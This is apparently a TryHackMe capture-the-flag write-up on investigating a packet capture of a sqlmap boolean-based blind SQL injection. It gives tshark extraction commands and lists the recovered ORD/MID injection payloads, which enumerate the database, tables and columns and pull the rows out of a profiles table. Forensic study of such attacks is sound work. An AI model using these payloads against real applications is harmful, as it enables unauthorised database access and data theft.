---
date: March 20, 2025
description: Inspecting sqlmap blind attack packets
platform: TryHackMe
categories: Forensics, Web
tags:
---
#pcap #sqli #forensics
# Sequel Dump 
A wave of suspicious web requests has bee detected hammering our database-driven application. Analysts suspect an automated `SQL injection attack` has been launched using `sqlmap`, leading to potential data `exfiltration`. Investigate the provided packet capture (`PCAP`) file to uncover the attackers’s actions and determine what was stolen!
# Solution

sqlmap logs, blind boolean-based we need to know what the attacker stole. 

Inspecting the pcap file it looks like its a boolean-based blind executed with sqlmap
![](_attachments/Pasted%20image%2020250321062649.png)

extract sqlmap request using tshark
## Extracting sqlmap requests 
(for inspection)

extract sqlmap user-agent queries
```bash
tshark -r challenge.pcapng -Y 'http.request and http.request.line contains "User-Agent: sqlmap"' -T fields -e http.request.uri.query | python3 -c "import sys, urllib.parse; [print(urllib.parse.unquote(line.strip())) for line in sys.stdin]" > sqlmap.queries

```
extract profile_db queries
```bash
tshark -r challenge.pcapng -Y 'http.request.uri.query contains "query=1%20AND%20" and http.request.uri.query contains profile_db' -T fields -e http.request.uri.query | python3 -c "import sys, urllib.parse; [print(urllib.parse.unquote(line.strip())) for line in sys.stdin]" | cut -d '=' -f2 > profile_db.queries
```

get tcp with profile db
matches queries
```bash
# sqlmap queries
tshark -r challenge.pcapng -Y 'http.request and http.request.line contains "User-Agent: sqlmap"' -T fields -e http.request.uri.query | python3 -c "import sys, urllib.parse; [print(urllib.parse.unquote(line.strip())) for line in sys.stdin]" > sqlmap.queries 
```
? checking manually in wireshark we can see what the response would look like if boolean is true / false

`http.response and frame contains "No results"` `http.response and not frame contains "No results"`
![](_attachments/Pasted%20image%2020250321063524.png)


filtering truthy response would give us an idea what data the attacker has exfiltrated,
        
to do so get the tcp stream for (truthy) values and also get the request using the tcp stream id that matches that response get tcp stream response

## Extract truthy requests that returns response
get tcp stream response (with truthy) 
```bash
tshark -r challenge.pcapng -Y "http.response and not frame contains \"No results\"" -T fields -e tcp.stream > tcp_true_responses.queries
```    

get tcp stream request from the tcp response list
```bash
tshark -r challenge.pcapng -Y "tcp.stream in {$(paste -sd, tcp_true_responses.queries)} and http.request.uri.query contains \"query=1%20AND%20\"" -T fields -e http.request.uri.query | python3 -c "import sys, urllib.parse; [print(urllib.parse.unquote(line.strip())) for line in sys.stdin]" > exfil.queries
```

## Scripting it 
described below 

# ORD technique step by step
just notes for scripting  created scuffed script `extract.py`

> always +1 per truthy if ord (51) was the last truthy then the character in question was chr(52)
# Database

## GET DB length
```sql
query=1 AND ORD(MID((IFNULL(CAST(CHAR_LENGTH(DATABASE()) AS NCHAR),0x20)),1,1))>51
```
## GET DB Characters
```sql
query=1 AND ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),8,1))>94
```
# Table Enumeration
## Table Count
`table_schema` = hexed db name
`COUNT(table_name)` -  `WHERE table_schema=hex(db))`  - `i,1))> 55`
```sql
query=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x70726f66696c655f6462),1,1))>48
```
## TABLE (n) length 
`CHAR_LENGTH(table_name)` -  `LIMIT n,1)`  - `i,1))> 55`
```sql
query=1 AND ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x70726f66696
c655f6462 LIMIT 0,1),1,1))>55
-- looks first table  first character
```

## TABLE (n) names
`table_schema` = hexed db name
`table_name` -  `WHERE table_schema=hex(db))` - `LIMIT n, 1)` - `i,1))> 55`
```sql
query=1 AND ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x70726f66696c655f6462 LIM
IT 0,1),8,1))>114
```
> do i need table schema? 

# Columns
## Column count
`COUNT(column_name)`
- hex table_name
- hex db_name
- char `(i, 1) > 50`
```sql
query=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x70726f66696c6573 AND table_schema=0x70726f66696c655f6462),1,1))>50
```
## Column (n) length
`CHAR_LENGTH(column_name)`
- hex table_name
- hex db_name
- `LIMIT n, 1)
- char `(i, 1)`
```
query=1 AND ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x70726f66696c6573 AND table_schema=0x70726f66696c655f6462 LIMIT 0,1),2,1))>48
```

## Column (n) name
`column_name`
- hex table_name
- hex db_name
- `LIMIT n, 1)
- char `(i, 1)`
```sql
query=1 AND ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x70726f66696c6573 AND table_schema=0x70726f66696c655f6462 LIMIT 0,1),2,1))>48
```

# Values
## Values count (n) length
`COUNT(*)` 
`(CHAR_LENGTH(`description)`
- `FROM profile_db.profiles`  
- `LIMIT n, 1)
- char `(i, 1)`
```sql
query=1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM profile_db.`profiles`),1,1))>54

query=1 AND ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(`description`) AS NCHAR),0x20) FROM profile_db.`profiles` ORDER BY id LIMIT 0,1),1,1))>48
```

## (n) Row (c) column 
`description`
- `FROM profile_db.profiles`  
- `LIMIT n, 1) - 
- char `(i, 1)`
```sql
query=1 AND ORD(MID((SELECT IFNULL(CAST(`description` AS NCHAR),0x20) FROM profile_db.`profiles` ORDER BY id LIMIT 0,1),1,1))>64
```

![](_attachments/Pasted%20image%2020250324043140.png)

